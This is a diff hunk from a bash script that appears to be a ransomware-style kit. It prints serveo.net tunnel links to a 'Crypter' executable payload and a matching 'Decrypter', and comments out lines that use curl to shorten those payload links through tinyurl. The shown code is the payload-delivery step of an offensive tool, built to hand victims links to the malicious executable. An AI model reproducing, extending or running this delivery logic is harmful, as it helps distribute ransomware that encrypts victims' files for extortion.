@@ -74,12 +74,12 @@ send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
 printf "\n"
 printf '\n\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Crypter:\e[0m\e[1;77m %s/%s.exe \e[0m' $send_link $payload_name
 printf '\n\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Decrypter:\e[0m\e[1;77m %s/%s.decrypter.exe \e[0m' $send_link $payload_name
-send_ipc=$(curl -s http://tinyurl.com/api-create.php?url=$send_link/$payload_name.exe | head -n1)
-send_ipd=$(curl -s http://tinyurl.com/api-create.php?url=$send_link/$payload_name.decrypter.exe | head -n1)
-printf '\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Or using tinyurl:\e[0m'
-printf "\n"
-printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Crypter:\e[0m\e[1;77m %s\e[0m\n" $send_ipc
-printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Decrypter:\e[0m\e[1;77m %s\e[0m" $send_ipd
+#send_ipc=$(curl -s http://tinyurl.com/api-create.php?url=$send_link/$payload_name.exe | head -n1)
+#send_ipd=$(curl -s http://tinyurl.com/api-create.php?url=$send_link/$payload_name.decrypter.exe | head -n1)
+#printf '\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Or using tinyurl:\e[0m'
+#printf "\n"
+#printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Crypter:\e[0m\e[1;77m %s\e[0m\n" $send_ipc
+#printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Decrypter:\e[0m\e[1;77m %s\e[0m" $send_ipd
 printf "\n"
 printf '\e[1;92m[\e[0m\e[1;77m!\e[0m\e[1;92m] Press Ctrl + c to stop server...\e[0m\n'
 
